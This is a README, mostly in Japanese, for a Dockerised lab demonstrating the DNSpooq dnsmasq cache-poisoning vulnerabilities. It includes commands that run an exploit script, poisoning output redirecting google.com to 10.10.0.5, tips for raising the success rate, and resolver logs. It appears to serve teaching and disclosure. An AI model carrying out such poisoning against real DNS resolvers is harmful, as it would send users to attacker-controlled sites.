# dnspooq
DNSpooq PoC - dnsmasq cache poisoning (CVE-2020-25686, CVE-2020-25684, CVE-2020-25685)

For educational purposes only

## 概要

このデモは、古いバージョンのdnsmasq (2.82) に存在するDNSキャッシュポイズニング脆弱性を実証します。攻撃が成功すると、正規のドメイン（google.com）へのアクセスが悪意のあるサーバーにリダイレクトされ、ユーザーが危険なサイトに誘導される様子を確認できます。

### デモの特徴
- **ブラウザ付きクライアントコンテナ**: 実際のユーザー体験を再現
- **視覚的な警告ページ**: 攻撃の危険性を分かりやすく表示
- **noVNC経由のアクセス**: ブラウザから直接デモ環境を操作可能

### デモの流れ
1. **攻撃前**: クライアントのブラウザでgoogle.comにアクセス → 正常なGoogleが表示
2. **攻撃実行**: DNSキャッシュポイズニング攻撃を実行
3. **攻撃後**: 同じブラウザでgoogle.comにアクセス → 偽の警告ページに誘導
4. **結果**: DNSの汚染により、ユーザーが意図しないサイトへ誘導される危険性を実証



## Requirements
- Docker compose
- Docker

## クイックスタート

```bash
# 1. コンテナを起動
docker-compose up -d

# 2. クライアントのブラウザにアクセス
# http://localhost:6080 を開く（パスワード: password）

# 3. 攻撃前の動作確認（クライアントのブラウザ内で）
# Firefoxを開いて google.com にアクセス → 正常なGoogleが表示される

# 4. 攻撃を実行（別のターミナルで）
docker-compose exec attacker python exploit.py

# 5. 攻撃後の動作確認（クライアントのブラウザ内で）
# Firefoxで再度 google.com にアクセス → 警告ページが表示される！
```

### 注意事項

- **重要**: 攻撃前にgoogle.comを解決すると、dnsmasqにキャッシュされて攻撃が成功しにくくなります
- キャッシュをクリアしたい場合は、forwarderコンテナを再起動してください：
  ```bash
  docker-compose restart forwarder
  ```

## Exploit

![dnspooq](imgs/dnspooq.png)

### Launch containers

```
$ docker-compose up -d
```

### Run exploit.py

```
$ docker-compose exec attacker bash
bash-5.0# python exploit.py
Querying non-cached names...
Generating spoofed packets...
Poisoned: b'google.com.' => 10.10.0.5
sent 3032017 responses in 50.309 seconds
```

### 攻撃前後の動作確認

#### 1. 攻撃前の正常な状態を確認（オプション）

**注意**: この手順を実行すると、google.comがキャッシュされて攻撃が成功しにくくなる可能性があります。攻撃の成功率を高めたい場合は、この手順をスキップしてください。

攻撃前の状態を確認したい場合は、別のドメイン（例: yahoo.com）で正常な動作を確認できます:

```
$ docker-compose exec forwarder dig yahoo.com +short
```

正常なIPアドレス（例: 74.6.xxx.xxx など）が返されます。

#### 2. 攻撃の実行

別のターミナルで攻撃を実行します（上記の「Run exploit.py」セクション参照）。

#### 3. 攻撃後の状態を確認

攻撃が成功すると、再度確認します:

```
$ docker-compose exec forwarder dig google.com +short
10.10.0.5
```

今度は悪意のあるサーバーのIPアドレス（10.10.0.5）が返されます。

#### 4. Webブラウザでの確認

最も分かりやすい確認方法は、クライアントコンテナのブラウザを使用することです：

1. **http://localhost:6080** にアクセス（パスワード: password）
2. デスクトップ内のFirefoxを開く
3. アドレスバーに `google.com` と入力
4. 攻撃が成功していれば、偽の警告ページが表示されます

この方法により、実際のユーザーと同じ体験ができ、DNSキャッシュポイズニング攻撃の危険性を視覚的に理解できます。

### View output from forwarder container

```
$ docker-compose logs -f forwarder
...
forwarder_1  | dnsmasq[1]: query[A] example.com from 10.10.0.3
forwarder_1  | dnsmasq[1]: forwarded example.com to 10.10.0.4
forwarder_1  | dnsmasq[1]: cached example.com is <CNAME>
forwarder_1  | dnsmasq[1]: cached google.com is 10.10.0.5
```

### View output from cache container

```
$ docker-compose logs -f cache
Attaching to dnspooq_cache_1
cache_1      | Sniffing...
cache_1      | Source port: 46816, TXID: 16476, Query: b'example.com.'
cache_1      | Source port: 16718, TXID: 54280, Query: b'example.com.'
...
cache_1      | Source port: 46816, TXID: 56240, Query: b'example.com.'
cache_1      | Source port: 46816, TXID: 24160, Query: b'example.com.'
cache_1      | Source port: 46816, TXID: 18189, Query: b'example.com.'
cache_1      | Source port: 46816, TXID: 40361, Query: b'example.com.'
cache_1      | Source port: 46816, TXID: 13100, Query: b'example.com.'
cache_1      | Source port: 46816, TXID: 47303, Query: b'example.com.'
```

## Reference
- https://www.jsof-tech.com/disclosures/dnspooq/
- https://www.jsof-tech.com/wp-content/uploads/2021/01/DNSpooq-Technical-WP.pdf

## Author
Teppei Fukuda
